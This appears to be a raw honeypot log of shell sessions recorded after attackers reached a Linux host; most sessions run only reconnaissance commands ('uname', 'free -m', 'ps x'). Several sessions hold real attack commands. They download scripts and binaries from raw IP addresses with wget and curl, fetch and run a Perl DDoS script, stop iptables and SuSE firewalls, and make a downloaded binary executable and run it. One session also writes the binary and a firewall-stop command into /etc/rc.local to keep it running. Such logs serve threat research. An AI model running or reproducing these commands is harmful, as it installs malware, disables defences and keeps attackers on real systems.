3b69261e07a247229a452bec4a36d45d	cd /tmp  |  |  cd /var/run  |  |  cd /mnt  |  |  cd /root  |  |  cd /
3b69261e07a247229a452bec4a36d45d	rm -f blj* blj.*
3b69261e07a247229a452bec4a36d45d	wget http://149.202.153.56/blj.sh  |  |  busybox wget http://149.202.153.56/blj.sh  |  |  curl -O http://149.202.153.56/blj.sh
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	cd /
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	cd /var
ea087c4bb3314dbab70eeb0abf2a6f8d	wget
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	mkdir www
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	cd /var/www
ea087c4bb3314dbab70eeb0abf2a6f8d	wget http://semprecomigo.hol.es
ea087c4bb3314dbab70eeb0abf2a6f8d	ftp
ea087c4bb3314dbab70eeb0abf2a6f8d	ssh
ea087c4bb3314dbab70eeb0abf2a6f8d	ps -aux
ea087c4bb3314dbab70eeb0abf2a6f8d	ifconfig
ea087c4bb3314dbab70eeb0abf2a6f8d	apt-get install upgrade
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	reboot
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	cd /
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	sudo poweroff
ea087c4bb3314dbab70eeb0abf2a6f8d	sudo reboot
ea087c4bb3314dbab70eeb0abf2a6f8d	reboot
ea087c4bb3314dbab70eeb0abf2a6f8d	cd /etc
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	cat /etc/shells
ea087c4bb3314dbab70eeb0abf2a6f8d	man /etc/shells
ea087c4bb3314dbab70eeb0abf2a6f8d	rpc
ea087c4bb3314dbab70eeb0abf2a6f8d	cd /var/www
ea087c4bb3314dbab70eeb0abf2a6f8d	wget http://revista_ciencia.espe.edu.ec/wp-content/uploads/2016/01/ddos.pl
ea087c4bb3314dbab70eeb0abf2a6f8d	s
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	perl ddos.pl
ea087c4bb3314dbab70eeb0abf2a6f8d	nano
ea087c4bb3314dbab70eeb0abf2a6f8d	vi
ea087c4bb3314dbab70eeb0abf2a6f8d	kernel
ea087c4bb3314dbab70eeb0abf2a6f8d	cat /etc/kernel
ea087c4bb3314dbab70eeb0abf2a6f8d	cd /etc/kernel
ea087c4bb3314dbab70eeb0abf2a6f8d	ls
ea087c4bb3314dbab70eeb0abf2a6f8d	cat prerm.d
0fb0bae4714b4152b43b8c10a495180d	/etc/init.d/iptables stop
0fb0bae4714b4152b43b8c10a495180d	service iptables stop
0fb0bae4714b4152b43b8c10a495180d	SuSEfirewall2 stop
0fb0bae4714b4152b43b8c10a495180d	reSuSEfirewall2 stop
0fb0bae4714b4152b43b8c10a495180d	wget -c http://222.186.34.203:5314/breeb
ea087c4bb3314dbab70eeb0abf2a6f8d	exit
873d7cc6f1c040388c7ed21b1d6de2b3	cd /tmp  |  |  cd /var/run  |  |  cd /mnt  |  |  cd /root  |  |  cd /
873d7cc6f1c040388c7ed21b1d6de2b3	rm -f blj* blj.*
873d7cc6f1c040388c7ed21b1d6de2b3	wget http://149.202.153.56/blj.sh  |  |  busybox wget http://149.202.153.56/blj.sh  |  |  curl -O http://149.202.153.56/blj.sh
84f3513c1bff4ea29e8b7b09446873c5	uname
84f3513c1bff4ea29e8b7b09446873c5	free -m
84f3513c1bff4ea29e8b7b09446873c5	ps x
34c43c8f105248668b612c38f1ac04f5	uname
34c43c8f105248668b612c38f1ac04f5	free -m
34c43c8f105248668b612c38f1ac04f5	ps x
6f22cd7b527b460291397605bede5ab5	uname
6f22cd7b527b460291397605bede5ab5	free -m
6f22cd7b527b460291397605bede5ab5	ps x
3040d1c5131f4453b94f3c654aadcd7b	uname
3040d1c5131f4453b94f3c654aadcd7b	free -m
3040d1c5131f4453b94f3c654aadcd7b	ps x
c1a70b5a1339487ca1a111eddffdcfa5	uname
c1a70b5a1339487ca1a111eddffdcfa5	free -m
c1a70b5a1339487ca1a111eddffdcfa5	ps x
957cd958ba0c427283eb337b00f7750e	uname
957cd958ba0c427283eb337b00f7750e	free -m
957cd958ba0c427283eb337b00f7750e	ps x
45280c34f84a4a268f7c64a85c929a29	uname
45280c34f84a4a268f7c64a85c929a29	free -m
45280c34f84a4a268f7c64a85c929a29	ps x
f4cb98423af54ba1adb63000a03d667e	uname
f4cb98423af54ba1adb63000a03d667e	free -m
f4cb98423af54ba1adb63000a03d667e	ps x
0f7cf0ee68f94f659b8cb6826600b1cc	uname
0f7cf0ee68f94f659b8cb6826600b1cc	free -m
0f7cf0ee68f94f659b8cb6826600b1cc	ps x
24cf6a8cc9804cc9a8fec74f81284982	uname
24cf6a8cc9804cc9a8fec74f81284982	free -m
24cf6a8cc9804cc9a8fec74f81284982	ps x
76fb2f0ad2644dae8b002afecaffbc4f	uname
76fb2f0ad2644dae8b002afecaffbc4f	free -m
76fb2f0ad2644dae8b002afecaffbc4f	ps x
c0ce38c27da44da594bcc639100e703b	uname
c0ce38c27da44da594bcc639100e703b	free -m
c0ce38c27da44da594bcc639100e703b	ps x
887669fa6b39432bbc556823cb1c1f02	uname
887669fa6b39432bbc556823cb1c1f02	free -m
887669fa6b39432bbc556823cb1c1f02	ps x
ade61745fcb64fd0b0e8668959a3973d	uname
ade61745fcb64fd0b0e8668959a3973d	free -m
ade61745fcb64fd0b0e8668959a3973d	ps x
7cb73551dc3c43348d342c34ad9f0f91	uname
7cb73551dc3c43348d342c34ad9f0f91	free -m
7cb73551dc3c43348d342c34ad9f0f91	ps x
103a968a098b4e5999e0a68bfe4ab7d2	uname
103a968a098b4e5999e0a68bfe4ab7d2	free -m
103a968a098b4e5999e0a68bfe4ab7d2	ps x
b24e185e427a4c6c943e274b26630898	uname
b24e185e427a4c6c943e274b26630898	free -m
b24e185e427a4c6c943e274b26630898	ps x
ce62d802d7a94fd7b763fd2cc344dbe3	uname
ce62d802d7a94fd7b763fd2cc344dbe3	free -m
ce62d802d7a94fd7b763fd2cc344dbe3	ps x
3c696d7708ef4a24abb8b34a91d77d54	uname
3c696d7708ef4a24abb8b34a91d77d54	free -m
3c696d7708ef4a24abb8b34a91d77d54	ps x
1543ab9f9ee545e28ca187e3ab8629fb	uname
1543ab9f9ee545e28ca187e3ab8629fb	free -m
1543ab9f9ee545e28ca187e3ab8629fb	ps x
7606687ecde14eefb9e4036b4da50052	uname
7606687ecde14eefb9e4036b4da50052	free -m
7606687ecde14eefb9e4036b4da50052	ps x
1a998f20292e4a958b92551c7c13c30d	uname
1a998f20292e4a958b92551c7c13c30d	free -m
1a998f20292e4a958b92551c7c13c30d	ps x
495137ddeaab4bd69f35b20e5b3a51d7	uname
495137ddeaab4bd69f35b20e5b3a51d7	free -m
495137ddeaab4bd69f35b20e5b3a51d7	ps x
db085ec357a448a6903654ade92257ea	uname
db085ec357a448a6903654ade92257ea	free -m
db085ec357a448a6903654ade92257ea	ps x
923bb36cffc24549b8b15b04ff1e88a6	uname
923bb36cffc24549b8b15b04ff1e88a6	free -m
923bb36cffc24549b8b15b04ff1e88a6	ps x
e19f7a1caa7a4343a4df3741943ec276	uname
e19f7a1caa7a4343a4df3741943ec276	free -m
e19f7a1caa7a4343a4df3741943ec276	ps x
ef55345c659a44e494a6f794dac72ebf	uname
ef55345c659a44e494a6f794dac72ebf	free -m
ef55345c659a44e494a6f794dac72ebf	ps x
74182fd9080944bbad2f8257ccbf9e2d	uname
74182fd9080944bbad2f8257ccbf9e2d	free -m
74182fd9080944bbad2f8257ccbf9e2d	ps x
eee0bc4253f3403fa34e9479af2ee0ea	uname
eee0bc4253f3403fa34e9479af2ee0ea	free -m
eee0bc4253f3403fa34e9479af2ee0ea	ps x
a5e8f482ccf04eccb89f88ffd5d7bae0	uname
a5e8f482ccf04eccb89f88ffd5d7bae0	free -m
a5e8f482ccf04eccb89f88ffd5d7bae0	ps x
86bf4b417fd64efcb8262252485082cf	uname
86bf4b417fd64efcb8262252485082cf	free -m
86bf4b417fd64efcb8262252485082cf	ps x
1555984f1ab946d387e43adfb00b065d	uname
1555984f1ab946d387e43adfb00b065d	free -m
1555984f1ab946d387e43adfb00b065d	ps x
c0a22a6570974bf0afb96b7d2885dadd	uname
c0a22a6570974bf0afb96b7d2885dadd	free -m
c0a22a6570974bf0afb96b7d2885dadd	ps x
602246bcf4a6476ab43c5cd29aaece9b	uname
602246bcf4a6476ab43c5cd29aaece9b	free -m
602246bcf4a6476ab43c5cd29aaece9b	ps x
6711bce3081449658dc86346f25993d2	uname
6711bce3081449658dc86346f25993d2	free -m
6711bce3081449658dc86346f25993d2	ps x
638747c8813f4c7ab3641465e4e1757a	uname
638747c8813f4c7ab3641465e4e1757a	free -m
638747c8813f4c7ab3641465e4e1757a	ps x
a7edf2357c41403090e1388f04bf4708	uname
a7edf2357c41403090e1388f04bf4708	free -m
a7edf2357c41403090e1388f04bf4708	ps x
7873ecbf2fff49c0b9644bcddaee0f3a	uname
7873ecbf2fff49c0b9644bcddaee0f3a	free -m
7873ecbf2fff49c0b9644bcddaee0f3a	ps x
202f3daa8d544b70bbdf9bc718f029ab	uname
202f3daa8d544b70bbdf9bc718f029ab	free -m
202f3daa8d544b70bbdf9bc718f029ab	ps x
c5aa4012fb7c49f8983d7a003652721a	uname
c5aa4012fb7c49f8983d7a003652721a	free -m
c5aa4012fb7c49f8983d7a003652721a	ps x
e7b2a0efffcc4bd180301d55e479883b	uname
e7b2a0efffcc4bd180301d55e479883b	free -m
e7b2a0efffcc4bd180301d55e479883b	ps x
abf9946c83234808897ba7c5d66dac0b	uname
abf9946c83234808897ba7c5d66dac0b	free -m
abf9946c83234808897ba7c5d66dac0b	ps x
50888ce43add411192f8801cbb8e6e48	uname
50888ce43add411192f8801cbb8e6e48	free -m
50888ce43add411192f8801cbb8e6e48	ps x
952fd46128374453bc036e1891a694b7	uname
952fd46128374453bc036e1891a694b7	free -m
952fd46128374453bc036e1891a694b7	ps x
2c809da4a1a44e7896e9c2a0f913e344	uname
2c809da4a1a44e7896e9c2a0f913e344	free -m
2c809da4a1a44e7896e9c2a0f913e344	ps x
8d3a62f0b86244e88923765f14ef9b0b	uname
8d3a62f0b86244e88923765f14ef9b0b	free -m
8d3a62f0b86244e88923765f14ef9b0b	ps x
1975ea1a86d54747874101e72a25b84b	uname
1975ea1a86d54747874101e72a25b84b	free -m
1975ea1a86d54747874101e72a25b84b	ps x
c2b5c86f29dc493c8bd68fb01c0517e9	uname
c2b5c86f29dc493c8bd68fb01c0517e9	free -m
c2b5c86f29dc493c8bd68fb01c0517e9	ps x
44bfc1c70d2244a085521cdb1916c6be	uname
44bfc1c70d2244a085521cdb1916c6be	free -m
44bfc1c70d2244a085521cdb1916c6be	ps x
e75e431dd2434cea98be61e453cb532a	uname
e75e431dd2434cea98be61e453cb532a	free -m
e75e431dd2434cea98be61e453cb532a	ps x
f25227484b624b98b75579172bcb4fa0	uname
f25227484b624b98b75579172bcb4fa0	free -m
f25227484b624b98b75579172bcb4fa0	ps x
ed897269a0974db0b3433b8c4c9c29e1	uname
ed897269a0974db0b3433b8c4c9c29e1	free -m
ed897269a0974db0b3433b8c4c9c29e1	ps x
e42832f13deb452fb983f61673a61923	uname
e42832f13deb452fb983f61673a61923	free -m
e42832f13deb452fb983f61673a61923	ps x
23d3b90b7c394baca6448a8caccd9388	uname
23d3b90b7c394baca6448a8caccd9388	free -m
23d3b90b7c394baca6448a8caccd9388	ps x
cf683f29e94849ec950c4f427fe2e3e1	uname
cf683f29e94849ec950c4f427fe2e3e1	free -m
cf683f29e94849ec950c4f427fe2e3e1	ps x
d33b2b208d7b401a9d4c2241f00de685	uname
d33b2b208d7b401a9d4c2241f00de685	free -m
d33b2b208d7b401a9d4c2241f00de685	ps x
d999b48da5ed49d98d078f841b0015c6	uname
d999b48da5ed49d98d078f841b0015c6	free -m
d999b48da5ed49d98d078f841b0015c6	ps x
b24b72d8e6034ee396d41c5d36513f55	uname
b24b72d8e6034ee396d41c5d36513f55	free -m
b24b72d8e6034ee396d41c5d36513f55	ps x
44ef678a80274a0bbcf43d683dd1dc6e	uname
44ef678a80274a0bbcf43d683dd1dc6e	free -m
44ef678a80274a0bbcf43d683dd1dc6e	ps x
b56540e72b5d4ad1ababb589eab0e636	uname
b56540e72b5d4ad1ababb589eab0e636	free -m
b56540e72b5d4ad1ababb589eab0e636	ps x
535258c99d3d495b8b8c475c81e353d1	uname
535258c99d3d495b8b8c475c81e353d1	free -m
535258c99d3d495b8b8c475c81e353d1	ps x
18ef3e8e09434b1da7c80918d1466186	uname
18ef3e8e09434b1da7c80918d1466186	free -m
18ef3e8e09434b1da7c80918d1466186	ps x
256c47c2f3da4f199c30c863e435109a	uname
256c47c2f3da4f199c30c863e435109a	free -m
256c47c2f3da4f199c30c863e435109a	ps x
06d6d767638c46078818d28046b17df4	uname
06d6d767638c46078818d28046b17df4	free -m
06d6d767638c46078818d28046b17df4	ps x
6d07a9ea27d24408b44f58e7a06c3bda	uname
6d07a9ea27d24408b44f58e7a06c3bda	free -m
6d07a9ea27d24408b44f58e7a06c3bda	ps x
57ad5cb60d704ef0865638cda54a560e	uname
57ad5cb60d704ef0865638cda54a560e	free -m
57ad5cb60d704ef0865638cda54a560e	ps x
8f4e368d5c774e6fb5449e9beefc202c	uname
8f4e368d5c774e6fb5449e9beefc202c	free -m
8f4e368d5c774e6fb5449e9beefc202c	ps x
71d4f27fb7d04e9eb29af7e225dddcdc	uname
71d4f27fb7d04e9eb29af7e225dddcdc	free -m
71d4f27fb7d04e9eb29af7e225dddcdc	ps x
26fadf4d016d43eabfadd29084ac9043	uname
26fadf4d016d43eabfadd29084ac9043	free -m
26fadf4d016d43eabfadd29084ac9043	ps x
5f6d28281ecd4023b67a94b9ba846bc3	uname
5f6d28281ecd4023b67a94b9ba846bc3	free -m
5f6d28281ecd4023b67a94b9ba846bc3	ps x
86eae1b860af42e0912bb72639d53520	uname
86eae1b860af42e0912bb72639d53520	free -m
86eae1b860af42e0912bb72639d53520	ps x
84ad4b49acbf498aa07c2548b2c273a3	uname
84ad4b49acbf498aa07c2548b2c273a3	free -m
84ad4b49acbf498aa07c2548b2c273a3	ps x
c52f103a85a4442b8055fcf1597e6fa1	uname
c52f103a85a4442b8055fcf1597e6fa1	free -m
c52f103a85a4442b8055fcf1597e6fa1	ps x
062e10d40964440bb97d1738691bac33	uname
062e10d40964440bb97d1738691bac33	free -m
062e10d40964440bb97d1738691bac33	ps x
aa4e3938d13c4241978200a697716ebb	uname
aa4e3938d13c4241978200a697716ebb	free -m
aa4e3938d13c4241978200a697716ebb	ps x
87ff60aa0c6d413cb3b01993e0b8c889	uname
87ff60aa0c6d413cb3b01993e0b8c889	free -m
87ff60aa0c6d413cb3b01993e0b8c889	ps x
c86b96b47377446ea5102d9f0ab32bf1	uname
c86b96b47377446ea5102d9f0ab32bf1	free -m
c86b96b47377446ea5102d9f0ab32bf1	ps x
ad7e2a21e84c43b68a3a141ab713e9b6	uname
ad7e2a21e84c43b68a3a141ab713e9b6	free -m
ad7e2a21e84c43b68a3a141ab713e9b6	ps x
0a5d014c62e9425abd360d7e81063010	uname
0a5d014c62e9425abd360d7e81063010	free -m
0a5d014c62e9425abd360d7e81063010	ps x
4b4f94e7f314455da4b55f00d5e3ca06	uname
4b4f94e7f314455da4b55f00d5e3ca06	free -m
4b4f94e7f314455da4b55f00d5e3ca06	ps x
3437ae400c63429298195ba641d7a24c	uname
3437ae400c63429298195ba641d7a24c	free -m
3437ae400c63429298195ba641d7a24c	ps x
f867546b9f8a4ff5a1cf739775221afb	uname
f867546b9f8a4ff5a1cf739775221afb	free -m
f867546b9f8a4ff5a1cf739775221afb	ps x
a8cec26656644fe4a83e6bd36d594e28	uname
a8cec26656644fe4a83e6bd36d594e28	free -m
a8cec26656644fe4a83e6bd36d594e28	ps x
fca0d3ef75634f5db6d47759262c4a39	uname
fca0d3ef75634f5db6d47759262c4a39	free -m
fca0d3ef75634f5db6d47759262c4a39	ps x
fdc012b4b0694835bbd666df85f94cef	uname
fdc012b4b0694835bbd666df85f94cef	free -m
fdc012b4b0694835bbd666df85f94cef	ps x
ff30eb60156e4518b5d3d6256403b704	uname
ff30eb60156e4518b5d3d6256403b704	free -m
ff30eb60156e4518b5d3d6256403b704	ps x
0cca9cf529d84b2bad042cb0aa9b94a5	uname
0cca9cf529d84b2bad042cb0aa9b94a5	free -m
0cca9cf529d84b2bad042cb0aa9b94a5	ps x
14fa1f5e5b66425cbc3fbc154accd449	uname
14fa1f5e5b66425cbc3fbc154accd449	free -m
14fa1f5e5b66425cbc3fbc154accd449	ps x
e13b3161c27a482fa2d5dc00109c1914	uname
e13b3161c27a482fa2d5dc00109c1914	free -m
e13b3161c27a482fa2d5dc00109c1914	ps x
21132f50a36a466b9c2230fdf3bee13b	uname
21132f50a36a466b9c2230fdf3bee13b	free -m
21132f50a36a466b9c2230fdf3bee13b	ps x
db5fd48b6f4d4735827a31bc188d8ffc	uname
db5fd48b6f4d4735827a31bc188d8ffc	free -m
db5fd48b6f4d4735827a31bc188d8ffc	ps x
f0862e74571f4226afc7cfa2704b7e8c	uname
f0862e74571f4226afc7cfa2704b7e8c	free -m
f0862e74571f4226afc7cfa2704b7e8c	ps x
49f7847390d24bfabd5d1af2a7c31f99	uname
49f7847390d24bfabd5d1af2a7c31f99	free -m
49f7847390d24bfabd5d1af2a7c31f99	ps x
245dab6903b640a68cf83da40f5e4c08	uname
245dab6903b640a68cf83da40f5e4c08	free -m
0813372067a64cad8cf2850d47578852	ervice iptables stop
245dab6903b640a68cf83da40f5e4c08	ps x
0813372067a64cad8cf2850d47578852	wget http://222.186.31.159:280/taii
0813372067a64cad8cf2850d47578852	chmod 0777 taii
0813372067a64cad8cf2850d47578852	chmod u+x taii
0813372067a64cad8cf2850d47578852	./taii &
0813372067a64cad8cf2850d47578852	chmod u+x taii
0813372067a64cad8cf2850d47578852	./taii &
0813372067a64cad8cf2850d47578852	cd /tmp
0813372067a64cad8cf2850d47578852	echo "cd  /root/" >  > /etc/rc.local
0813372067a64cad8cf2850d47578852	echo "./cont&" >  > /etc/rc.local
0813372067a64cad8cf2850d47578852	echo "./taii&" >  > /etc/rc.local
0813372067a64cad8cf2850d47578852	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
0a71473c91214e40aade922baa1e7f54	uname
0a71473c91214e40aade922baa1e7f54	free -m
0a71473c91214e40aade922baa1e7f54	ps x
376719a78310442bb4c96795dce00530	uname
376719a78310442bb4c96795dce00530	free -m
376719a78310442bb4c96795dce00530	ps x
57f5c024141e43e7a13427d420bf7357	uname
57f5c024141e43e7a13427d420bf7357	free -m
57f5c024141e43e7a13427d420bf7357	ps x
6c729313b45e4ffcb50ed56bb9779e86	uname
6c729313b45e4ffcb50ed56bb9779e86	free -m
6c729313b45e4ffcb50ed56bb9779e86	ps x
d38e4749760b48c095539fac3dd543df	uname
d38e4749760b48c095539fac3dd543df	free -m
d38e4749760b48c095539fac3dd543df	ps x
f401f9da0e5643abb3d63736bac378bf	uname
f401f9da0e5643abb3d63736bac378bf	free -m
f401f9da0e5643abb3d63736bac378bf	ps x
0616bb5382ab4586bbd39fc8afa5d14d	uname
0616bb5382ab4586bbd39fc8afa5d14d	free -m
0616bb5382ab4586bbd39fc8afa5d14d	ps x
456afc751df245ce81762a2319319c4a	uname
456afc751df245ce81762a2319319c4a	free -m
456afc751df245ce81762a2319319c4a	ps x
882979f1e30a46c2ab963a01c9d539c8	uname
882979f1e30a46c2ab963a01c9d539c8	free -m
882979f1e30a46c2ab963a01c9d539c8	ps x
dfd2d86e9efb4a819c16f4a92a2db9da	uname
dfd2d86e9efb4a819c16f4a92a2db9da	free -m
dfd2d86e9efb4a819c16f4a92a2db9da	ps x
060186933d9f4a81929dcbb341ceddd6	uname
060186933d9f4a81929dcbb341ceddd6	free -m
060186933d9f4a81929dcbb341ceddd6	ps x
d0dcc40e78cf45fca9eb024883f515a4	uname
d0dcc40e78cf45fca9eb024883f515a4	free -m
d0dcc40e78cf45fca9eb024883f515a4	ps x
6a86e5417c354423a9c8a09834c4fa1a	uname
6a86e5417c354423a9c8a09834c4fa1a	free -m
6a86e5417c354423a9c8a09834c4fa1a	ps x
c2bc47505f8742d083d4d7f2ed1f8184	uname
c2bc47505f8742d083d4d7f2ed1f8184	free -m
c2bc47505f8742d083d4d7f2ed1f8184	ps x
52b6e0d94ce84e318100303deba6725e	uname
52b6e0d94ce84e318100303deba6725e	free -m
52b6e0d94ce84e318100303deba6725e	ps x
5d057e4fb09c4e348a60972abe430020	uname
5d057e4fb09c4e348a60972abe430020	free -m
5d057e4fb09c4e348a60972abe430020	ps x
0da6e513f0ee4808af6d4651f99387f4	uname
0da6e513f0ee4808af6d4651f99387f4	free -m
0da6e513f0ee4808af6d4651f99387f4	ps x
b07146a12d8a470584f375d7144a9dcf	uname
b07146a12d8a470584f375d7144a9dcf	free -m
b07146a12d8a470584f375d7144a9dcf	ps x
7fd7f38045bd477bb7a7689b043dda3b	uname
7fd7f38045bd477bb7a7689b043dda3b	free -m
7fd7f38045bd477bb7a7689b043dda3b	ps x
f2adb0f30bcd434dba02be04c07c4126	uname
f2adb0f30bcd434dba02be04c07c4126	free -m
f2adb0f30bcd434dba02be04c07c4126	ps x
833c033b44154bb58557455a124faa2a	uname
833c033b44154bb58557455a124faa2a	free -m
833c033b44154bb58557455a124faa2a	ps x
e18c3534e2144b0394492f2b53404d23	uname
e18c3534e2144b0394492f2b53404d23	free -m
e18c3534e2144b0394492f2b53404d23	ps x
7d883337577349239757666c56fc3c1f	uname
7d883337577349239757666c56fc3c1f	free -m
7d883337577349239757666c56fc3c1f	ps x
906a8811e58345fcaf61fb4a2ce11aa4	uname
906a8811e58345fcaf61fb4a2ce11aa4	free -m
906a8811e58345fcaf61fb4a2ce11aa4	ps x
71af0c4bf4704084b907d2fe40e1c081	uname
71af0c4bf4704084b907d2fe40e1c081	free -m
71af0c4bf4704084b907d2fe40e1c081	ps x
dbc0d3201f044f33a8667e8031d19e9b	uname
dbc0d3201f044f33a8667e8031d19e9b	free -m
dbc0d3201f044f33a8667e8031d19e9b	ps x
92b72b8018184402b899f117b37598bb	uname
92b72b8018184402b899f117b37598bb	free -m
92b72b8018184402b899f117b37598bb	ps x
ba03c59ef5ce4e68a62c7714263be5ba	uname
ba03c59ef5ce4e68a62c7714263be5ba	free -m
ba03c59ef5ce4e68a62c7714263be5ba	ps x
b8c1d391204c413ab77ca04e799a13bc	uname
b8c1d391204c413ab77ca04e799a13bc	free -m
b8c1d391204c413ab77ca04e799a13bc	ps x
5fd5605bbcba4b13a67cc7d54381e1b2	uname
5fd5605bbcba4b13a67cc7d54381e1b2	free -m
5fd5605bbcba4b13a67cc7d54381e1b2	ps x
254b4e6426224e1ca8aab7f3639c1b40	uname
254b4e6426224e1ca8aab7f3639c1b40	free -m
254b4e6426224e1ca8aab7f3639c1b40	ps x
fd1d0e75229e46de930e208d0f674fdb	uname
fd1d0e75229e46de930e208d0f674fdb	free -m
fd1d0e75229e46de930e208d0f674fdb	ps x
21a15e9ded924e2598e466ff7c29dacb	uname
21a15e9ded924e2598e466ff7c29dacb	free -m
21a15e9ded924e2598e466ff7c29dacb	ps x
42312a98d3114161bdeb2233d4dee9aa	uname
42312a98d3114161bdeb2233d4dee9aa	free -m
42312a98d3114161bdeb2233d4dee9aa	ps x
3cdfac915f684e46aad090971946cc3d	uname
3cdfac915f684e46aad090971946cc3d	free -m
3cdfac915f684e46aad090971946cc3d	ps x
f4b73925f62842d8b33fbe50831c7483	uname
f4b73925f62842d8b33fbe50831c7483	free -m
f4b73925f62842d8b33fbe50831c7483	ps x
7b6656b2e4cf4af5abcb6e56f7ea905a	uname
7b6656b2e4cf4af5abcb6e56f7ea905a	free -m
7b6656b2e4cf4af5abcb6e56f7ea905a	ps x
8cc67db02a3d4cc98ec1bd68687235c4	uname
8cc67db02a3d4cc98ec1bd68687235c4	free -m
8cc67db02a3d4cc98ec1bd68687235c4	ps x
5bd121a0ba954e81bde2505857d88032	uname
5bd121a0ba954e81bde2505857d88032	free -m
5bd121a0ba954e81bde2505857d88032	ps x
25004a456a5944b194ca35cbbd2fcd66	uname
25004a456a5944b194ca35cbbd2fcd66	free -m
25004a456a5944b194ca35cbbd2fcd66	ps x
ceb1cd96869a43a7be2ad75df0d708b9	uname
ceb1cd96869a43a7be2ad75df0d708b9	free -m
ceb1cd96869a43a7be2ad75df0d708b9	ps x
906aab161da54e5487531eb437f7c24e	uname
906aab161da54e5487531eb437f7c24e	free -m
906aab161da54e5487531eb437f7c24e	ps x
0c16f9deafeb4e839ce7583ac1ecdad1	uname
0c16f9deafeb4e839ce7583ac1ecdad1	free -m
0c16f9deafeb4e839ce7583ac1ecdad1	ps x
3b3b418f1b474327b169fbcd31bd84b7	uname
3b3b418f1b474327b169fbcd31bd84b7	free -m
3b3b418f1b474327b169fbcd31bd84b7	ps x
c8b8b29f24e240e9a934db0a22dc9af6	uname
c8b8b29f24e240e9a934db0a22dc9af6	free -m
c8b8b29f24e240e9a934db0a22dc9af6	ps x
7b02ff6402c14e53b6c72351d90074ca	uname
7b02ff6402c14e53b6c72351d90074ca	free -m
7b02ff6402c14e53b6c72351d90074ca	ps x
ad9bb36f907648d5bee2cbef8adbe2ac	uname
ad9bb36f907648d5bee2cbef8adbe2ac	free -m
ad9bb36f907648d5bee2cbef8adbe2ac	ps x
dfa6fb627a334cfeb5787ec63785bc8a	uname
dfa6fb627a334cfeb5787ec63785bc8a	free -m
dfa6fb627a334cfeb5787ec63785bc8a	ps x
1fc16adf4dae4402a1d367fe80003a61	uname
1fc16adf4dae4402a1d367fe80003a61	free -m
1fc16adf4dae4402a1d367fe80003a61	ps x
0c63275f545048f9ac79f83ef09be10d	uname
0c63275f545048f9ac79f83ef09be10d	free -m
0c63275f545048f9ac79f83ef09be10d	ps x
2e406964362249dfbd4f6ab7657aa1aa	uname
2e406964362249dfbd4f6ab7657aa1aa	free -m
2e406964362249dfbd4f6ab7657aa1aa	ps x
b22ab30e1a38447bbc13d7f0ec7deaaa	uname
b22ab30e1a38447bbc13d7f0ec7deaaa	free -m
b22ab30e1a38447bbc13d7f0ec7deaaa	ps x
870da20ac80345b7995f88fe4c127b59	uname
870da20ac80345b7995f88fe4c127b59	free -m
870da20ac80345b7995f88fe4c127b59	ps x
c94a1ce7ea5941e79faf93f05019aebf	uname
c94a1ce7ea5941e79faf93f05019aebf	free -m
c94a1ce7ea5941e79faf93f05019aebf	ps x
5802b57189a24c0b99d924337d3de0be	uname
5802b57189a24c0b99d924337d3de0be	free -m
5802b57189a24c0b99d924337d3de0be	ps x
a97c2c7e80ae428db82810248695ae12	uname
a97c2c7e80ae428db82810248695ae12	free -m
a97c2c7e80ae428db82810248695ae12	ps x
6e80ff0c96d3435eae61c5dad1da7973	uname
6e80ff0c96d3435eae61c5dad1da7973	free -m
6e80ff0c96d3435eae61c5dad1da7973	ps x
dfe3e55a51274f7cb9a789ebf2e815b0	uname
dfe3e55a51274f7cb9a789ebf2e815b0	free -m
dfe3e55a51274f7cb9a789ebf2e815b0	ps x
62b8a2c90b1e4cc78665106dc71ad025	uname
62b8a2c90b1e4cc78665106dc71ad025	free -m
